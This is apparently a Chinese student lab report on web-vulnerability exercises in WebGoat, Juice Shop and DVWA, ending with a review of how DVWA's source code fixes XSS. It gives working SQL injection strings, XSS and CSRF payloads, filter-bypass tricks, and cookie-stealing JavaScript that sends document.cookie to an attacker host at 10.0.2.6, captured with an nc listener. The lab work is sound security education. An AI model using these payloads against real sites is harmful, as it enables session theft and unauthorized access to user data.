# Web 应用漏洞攻防

## 实验目的

- 了解常见 Web 漏洞训练平台；
- 了解 常见 Web 漏洞的基本原理；
- 掌握 OWASP Top 10 及常见 Web 高危漏洞的漏洞检测、漏洞利用和漏洞修复方法；

## 实验环境

- WebGoat
- Juice Shop

## WebGoat环境下进行漏洞练习

* 首先简单进行了测试，按F12打开开发人员工具，选择网络，点击go！，查看POST包内容，即可捕获到magic number：51

<img src="image/12.png" />

### SQL注入

* 在**Numeric SQL Injection**中，页面的主要功能是通过用户ID来获取用户信息；如图，当输入字符串为`' or '1'='1`时，注入信息为`SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or '1' = '1'`，此时页面会输出所有用户的所有信息

<img src="image/13.png" />

* **Advanced SQL Injection**页面中，主要目的是让我们执行union查询获得Dave这个账号的密码

分析数据库的表格格式，可得用户数据的表格格式

```sql
REATE TABLE user_data (userid int not null,
                        first_name varchar(20),
                        last_name varchar(20),
                        cc_number varchar(30),
                        cc_type varchar(10),
                        cookie varchar(20),
                        login_count int);
```

密码的表名为user_system_data，列为password 

```sql
CREATE TABLE user_system_data (userid int not null primary key,
			                   user_name varchar(12),
			                   password varchar(10),
			                   cookie varchar(30));
```

在Name一栏中输入`Smith' order by 7--`得到正确的用户信息表格信息

<img src="image/14.png" />

根据此原理，在Name中输入`Smith' select null,user_name,password,null from user_system_data--`得到用户密码表格的正确信息，找到dave的密码信息为 ﻿`passW0rD`

<img src="image/15.png" />

### xss攻击

* **Stored xss**

>实验原理：
>
>1.用户A修改个人信息，并将带有威胁性的js代码作为个人信息发送到server端；
>
>2.server端未加过滤将用户资料存储到服务器； 
>
>3.用户B在好友列表中看到用户A，并查看用户A个人资料；
>
>4.server端取出用户A资料返回到web前端；
>
>5.前端按照预先规则展示，其中包含了用户A带有html标签和js的前端可执行代码，从而在用户B机器上执行了用户A预先设定好的任意威胁性的代码。

* 首先进行登陆操作，可以看到Tom Cat 的密码为tom，输入后即可登录

<img src="image/16.png" />

* 登陆后修改ViewProfile部分，如将其Street部分改为<script>alert('hahaha');</script>

<img src="image/17.png" />

* 此时更新文件，会显示弹窗，由于添加了alert（’XSS‘），则当点击Update Profile或者logout的时候，都会给出alert（）提示，显示hahahaha，说明在更改提交个人信息时，网页执行了个人信息中的脚本代码，根据此漏洞可在他人搜索时执行恶意代码

<img src="image/18.png" />

* 然后我们以Larry的身份进行登录，再进行文件搜索，输入搜索Tom的个人信息

<img src="image/19.png" />

* 可以看到，搜索到Tom的信息时，也执行了Tom植入的代码，显示弹窗hahahaha

<img src="image/20.png" />

* **Reflected XSS**

> 实验原理：在输入框中输入脚本，而浏览器又不会对用户输入做格式验证或任何数据处理，因此就会导致浏览器执行非法代码

<img src="image/21.png" />

* 直接在 ﻿Enter your three digit access code:  中输入下行恶意代码，浏览器执行非法代码后即显示弹窗

```javascript
<script>alert('hahahaha')</script>
```

<img src="image/22.png" />

* **CSRF Prompt By-Pass**

> 实验原理：在被攻击者打开一个网页（攻击者修改过）的时候，加载页面的时候，会自动向后台发请求。慈湖要求向新闻组发送email包含恶意请求，首先转账，然后请求提示确认

<img src="image/23.png" />

* 查看src及menu参数，对发送信息进行修改

```javascript
<HR>
<iframe src="attack?Screen=1471017872&menu=900&transferFunds=5000"/>
<br>
<HR>
<iframe src="attack?Screen=1471017872&menu=900&transferFunds=CONFIRM"/>
<HR>
```

页面在加载第一个frame时，发送转账5000的请求：

```javascript
<iframe src="attack?Screen=1471017872&menu=900&transferFunds=5000"/>
```

加载第二个iframe时，自动访问网址，显示一个确认按钮，来确认转账成功。 

```javascript
<iframe src="attack?Screen=1471017872&menu=900&transferFunds=CONFIRM"/>
```

<img src="image/24.png" />

* 结果如下，可以看到转账确认按钮

<img src="image/25.png" />

###  ﻿**Denial of Service **

> 实验原理：数据库连接总是要占用移动资源的，过度使用会影响系统性能。我们的目标网站允许多次登陆，但它有一个数据库的连接池，只能最大允许两个连接存在，因此我们必须要获得多个用户名和密码，分别登陆，使其超过允许的最大连接数，造成拒绝服务。

* 此次实验未给出需要的用户名及密码，根据之前所学SQL注入知识，发现进行查找操作时执行的sql语句是

```sql
SELECT * FROM user_system_data WHERE user_name = 'webgoat' and password = 'webgoat'
```

为了让其输入数据库中全部内容，语句应该为

```sql
SELECT * FROM user_system_data WHERE user_name = 'webgoat' and password = ''or'1'='1'
```

分析可得应输入

```sql
'or'1'='1
```

<img src="image/26.png" />

* 在Name中输入任意名称，在Password中输入`'or'1'='1`来获取全部用户名及密码

<img src="image/34.png" />

* 打开三个浏览器，分别输入三个人的账号和密码，由于只允许最大两个连接存在，第三个人的连接失败，这就造成了拒绝服务攻击

<img src="image/35.png" />

<img src="image/37.png" />

<img src="image/36.png" />

###  ﻿Code Quality  

> 实验原理：一个站点的开发往往不是个人，而是一个集体，一个团队，那么开发者在开发的过程中呢，往往会为了开发方便或者由于某种心理情绪留下一些重要的数据或者隐私。进而造成敏感数据的泄露，危害站点安全。那么也就是说我们往往可以通过对源代码中注释的阅读，发现一些重要的信息。例如：本实验中的用户名和密码

* 如图，按F12打开页面源代码，仔细查找，找到下面一行注释，发现是网站的用户账户和密码

```html
 FIXME admin:adminpw  
```

<img src="image/29.png" />

* 使用此id和密码登录，即可进入

<img src="image/28.png" />

###  ﻿Concurrency  

> 实验原理：JAVA代码对用户名使用一个静态的变量。当提交2次时，同样的线程以及由此产生的包含第一次请求的用户名的同样的静态变量将被使用。用户可以利用应用程序的线程错误来查看其他同一时间访问同一函数的同时的信息。

* 在**Thread Safety Problems**测试中，打开两个浏览器，一个输入用户名Jeff，另一个输入用户名dave。同时按下两个浏览器中的submit按钮。显示的结果却都是dave的信息，说明存在并发错误

<img src="image/30.png" />

* 在**Shopping Cart Concurrency Flaw**中利用此并发性问题，以较低的价格购买商品。具体操作步骤为：窗口A选择物品后进入purchase页面，窗口B选择更多物品后更新购物车，返回窗口A进行confirm，发现窗口A购买成功，物品是B中选择的商品，但是是A中选择的价格

<img src="image/31.png" />

<img src="image/32.png" />

<img src="image/33.png" />

## Juice Shop环境下进行漏洞练习

* 登录到juice shop界面后，发现就是一个饮品店？查看其源代码，发现隐藏的积分榜，登录到/score-board后开始真正的漏洞练习

<img src="image/38.png" />

<img src="image/39.png" />

### **SQL注入**

在用户登陆界面发现，在email中输入单引号会报错（但输出内容为[object,object]不为sql语句，使用burp suite抓包也没有结果），根据之前webgoat中学习的sql注入内容推测完整的sql如下

```sql
select * form Users where email='' and password='md5(password)'
```

根据sql报错格式，在email一栏输入 `' or 1=1--`，密码输入任意值即可以管理员身份登录（由于管理员的账户在数据库中为第一个）

<img src="image/41.png" />

* **Five-Star Feedback**：Get rid of all 5-star customer feedback.

在收藏的地址中找到隐藏的 ﻿Administrator 界面登录http://localhost:3000/#/administration

<img src="image/45.png" />

* **Login Bender**：Log in with Bender's user account.

根据上面发现的的sql注入漏洞，同时根据管理员用户名推测其id后缀也为`@juice-sh.op`，在email栏输入代码，密码栏随意输入即可

```sql
bender@juice-sh.op' and 1=1--+
```

<img src="image/46.png" />

### **XSS攻击**

*  ﻿﻿**Client-side XSS Protection**：Perform a *persisted* XSS attack with `  ﻿ <iframe src="javascript:alert(`xss`)">    ` bypassing a *client-side* security mechanism.  

  绕过客户端安全机制执行持久的XSS攻击

存储型的xss攻击则需访问数据库，发现网站在注册时的账号信息可写入数据库

<img src="image/42.png" />

使用burp suite进行抓包拦截，并将email部分修改为如下代码

```javascript
<script>alert("XSS")</script>
```

<img src="image/43.png" />

使用刚刚sql注入实验发现的漏洞，登录管理员账号，进入http://localhost:3000/#/administration，发现在用户信息中存在xss攻击语句，说明存储成功（推测可能是因为使用docker搭建环境无法显示xss弹窗）

```sql
<script>alert("XSS")</script>
```

<img src="image/44.png" />

### Broken Access Control

**Forged Feedback**：Post some feedback in another users name.

在上面的管理员数据库中可看到其他用户的数据，，登入上面实验中登录的bender@juice-sh.op后在评论处抓包修改userid=5即可使用他人的用户名进行评论

<img src="image/47.png" />

<img src="image/48.png" />

在管理员权限的数据库中可找到此评价，用户id为修改后的5，不为原来的3

<img src="image/49.png" />

###  Improper Input Validation 

**Payback Time**：Place an order that makes you rich.

本题要求下单后变得富有（账户金额增加），发现将商品加入购物车时代码没有进行输入数值范围的检测（输入商品数应大于0）猜测可能通过修改下单数量为负数增加账户金额

<img src="image/50.png" />

可以看到购物车中商品数量为-1，需要支付金额为-1.99（即增加1.99）

<img src="image/51.png" />

付款后即可成功

<img src="image/52.png" />

###   Sensitive Data Exposure 

**Confidential Document**：Access a confidential document.

* 要求利用在源代码中出现的敏感信息泄露来查阅机密文件

在about us中可以找到一行超链接，点击发现是一个文件

<img src="image/53.png" />

<img src="image/56.png" />

按F12查看源代码，发现其超链接为

```html
href="/ftp/legal.md"
```

<img src="image/54.png" />

推测其他文件的目录为http://127.0.0.1:3000/ftp，对该网址进行访问，得到文件目录，随意点开一个文件即可完成

<img src="image/55.png" />

## 使用DVWA进行漏洞练习（可选）

### 反射型xss攻击

* 查看源码，可以看到，在安全等级为低时，源码中没有对用户提交的数据做任何处理，只是简单判断如果提交的数据是否存在且不为空，就输出Hello+提交的内容

<img src="image/4.png" />

测试代码：

```java
<script> alert('xss')</script> //验证弹窗
<script>location='https://www.baidu.com'</script>  //重定向到百度
```

测试截图：

<img src="image/2.png" />

<img src="image/3.png" />

#### 获取cookie实验

* **实验原理**

>1. 黑客首先向服务器发送js脚本
>2. 服务器将含有js脚本的页面发给黑客
>3. 黑客将js脚本的页面的url发送给被攻击方
>4. 黑客获取被攻击方的cookie

首先测试构造获取cookie的JavaScript代码：`<script>alert(document.cookie)</script>`，如图

<img src="image/5.png" />

在本机/var/www/html中制作一个js脚本

```javascript
var img = new Image();
img.src = "http://10.0.2.6:88/cookies.php?cookie="+document.cookie;
```

<img src="image/6.png" />

在kali中使用`nc -vnlp 88`进行监听，在DVWA平台进行测试此行代码，可获取到用户cookie

```js
<script src='http://10.0.2.6/xxsec.js'></script>
```

<img src="image/7.png" />

### 存储型xss攻击

> 存储型XSS，也叫持久型XSS，主要是将XSS代码发送到服务器（不管是数据库、内存还是文件系统等。），然后在下次请求页面的时候就不用带上XSS代码了。最典型的就是留言板XSS。用户提交了一条包含XSS代码的留言到数据库。当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。浏览器发现有XSS代码，就当做正常的HTML和JS解析执行。XSS攻击就发生了。

---

测试代码：

```html
<a href=http://10.0.2.6>登录</a>；//点击 ' 登录 '，直接跳转到http://10.0.2.6页面（自己搭建的服务器界面）
```

<img src="image/8.png" />

<img src="image/9.png" />

* 注：每次实验后都需重置数据库

#### 获取cookie实验

在本机/var/www/html中制作一个js脚本

```javascript
var img = new Image();
img.src = "http://10.0.2.6:88/cookies.php?cookie="+document.cookie;
```

<img src="image/6.png" />

在kali中使用`nc -vnlp 88`进行监听，在DVWA平台进行测试此行代码，可获取到用户cookie

```js
<script src='http://10.0.2.6/xxsec.js'></script>
```

<img src="image/10.png" />

<img src="image/11.png" />

## 尝试从源代码层面修复漏洞（可选）

此处通过观察DVWA网站源码来观察如何一步一步进行漏洞修复

### 反射型xss攻击防护（Reflected XSS）

* 在安全等级为低时，源码中没有对用户提交的数据做任何处理，只是简单判断如果提交的数据是否存在且不为空，就输出Hello+提交的内容,极易被攻击

```js
low Reflected XSS Source
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?>
```

* 使用str_replace函数将输入中的<script>替换成空，把script脚本当做字符串来处理，但仍可以将将<script>可以写成<Script>，大小写混淆绕过

例如

```js
<Script>alert(‘xss’)</script>
```

或者嵌入绕过，可以将script嵌入到<script>中

`<scr<script>ipt>`

```js
<scr<script>ipt>alert('XSS1')</script> 
```

```js
Medium Reflected XSS Source
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```

* 代码使用preg_replace() 函数用于正则表达式的搜索和替换，将script前后相关的内容都替换为空，使得双写绕过、大小写混淆绕过不再有效，即只要遇到与scipt有关的字符都进行替换为空，输入不在含有script；（正则表达式中i表示不区分大小写）

仅预防script代码插入，可以通过img、body等标签事件或者iframe等标签的src注入恶意的js代码

```js
<body οnlοad=alert('XSS2')>
<a href=http://10.0.2.6>登录</a>
```

```js
High Reflected XSS Source
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```

* 当安全级别为impossible，使用htmlspecialchars() 函数把预定义的字符转换为 HTML 实体，防止浏览器将其作为HTML元素（恶意代码）；不能实现反射型XSS攻击；

```js
Impossible Reflected XSS Source
<?php

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $name = htmlspecialchars( $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

### 存储型xss攻击防护（Stored XSS）

* 对输入的name参数和message参数并没有做XSS方面的过滤与检查，并且数据存储在数据库中，所以存在明显的存储型XSS漏洞；

```js
Low Stored XSS Source
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitize name input
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

* 由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码；对于name参数，使用str_replace函数将输入中的<script>删除，把script脚本当做字符串来处理，仍然存在存储型的XSS。

```js
<Script>alert(‘XSS’)</script>    #可以在name中将<script>可以写成<Script>，大小写混淆绕过
```

```js
Medium Stored XSS Source
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

* 对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码；对于name参数，High级别的代码使用preg_replace() 函数用于正则表达式的搜索和替换，将script前后相关的内容都替换为空，使得双写绕过、大小写混淆绕过不再有效；（正则表达式中i表示不区分大小写）虽然在name参数中无法使用<script>标签注入XSS代码，但是可以通过img、body等标签事件或者iframe等标签的src注入恶意的js代码。

  ```html
  <body οnlοad=alert('XSS2')>
  <a href=http://10.0.2.6>登录</a>
  ```

```js

High Stored XSS Source
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

* 当安全级别为impossible时，对name、message参数均使用了htmlspecialchars函数进行编码，因此无法再通过name、message参数注入XSS代码，不能实现存储型XSS攻击。

```js
Impossible Stored XSS Source
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = stripslashes( $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $name = htmlspecialchars( $name );

    // Update database
    $data = $db->prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' );
    $data->bindParam( ':message', $message, PDO::PARAM_STR );
    $data->bindParam( ':name', $name, PDO::PARAM_STR );
    $data->execute();
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

## 遇到的问题：

* burpsuite无法抓到包，发现使用了本地程序不适用代理，删除即可

<img src="image/40.png" />

* 无法显示xss攻击结果，后来在积分板界面发现这一条，推测xss攻击无法在docker上实现

```
Perform a reflected XSS attack with <iframe src="javascript:alert(`xss`)">. (This challenge is not available on Docker!)
```

## 参考资料

1.[kali之DVWA](https://www.cnblogs.com/aeolian/p/11023238.html)

2.[**Kali渗透测试之DVWA系列4——反射型XSS(跨站脚本攻击)**](https://blog.csdn.net/weixin_43625577/article/details/89917893)

3.[WebGoat:Concurrency](http://blog.chinaunix.net/uid-26235486-id-3334520.html)

4.[WebGoat Day3 Denial of Service ](http://blkstone.github.io/2016/07/14/webgoat-denial-of-service/)

5.[**黑客游戏| Owasp juice shop (一)** ](https://www.freebuf.com/column/155374.html)